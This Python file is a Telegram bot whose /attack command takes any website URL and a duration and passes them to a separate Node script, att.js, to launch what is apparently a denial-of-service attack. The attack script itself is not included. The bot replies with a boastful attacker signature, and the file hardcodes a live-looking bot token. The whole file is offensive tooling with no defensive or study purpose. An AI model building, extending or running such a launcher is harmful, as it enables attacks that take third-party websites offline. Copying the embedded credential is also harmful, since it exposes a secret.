import subprocess
from telegram.update import Update
from telegram.ext import Updater, CommandHandler, CallbackContext

# Telegram bot token
TOKEN = "6311954830:AAFelhOxi5GkzecWwiQIccxvXnfc1rppOQI"

def attack(update: Update, context: CallbackContext) -> None:
    args = context.args
    if len(args) < 2:
        update.message.reply_text("Usage: /attack <website_url> <time_in_seconds>")
        return

    website_url = args[0]
    time = args[1]

    try:
        # Run the command with subprocess
        result = subprocess.run(['node', 'att.js', website_url, time], capture_output=True, text=True, check=True)
        output = result.stdout.strip()
        update.message.reply_text(output or "ATTACK SEND BY 😈MD OMOR FARUK😈")  # Send success message or default message
    except subprocess.CalledProcessError as e:
        error_msg = f"Error: {e.stderr.strip()}" if e.stderr else "Unknown error occurred"
        update.message.reply_text(error_msg)  # Send error message

def main():
    updater = Updater(TOKEN, use_context=True)
    dispatcher = updater.dispatcher
    dispatcher.add_handler(CommandHandler("attack", attack))
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
    
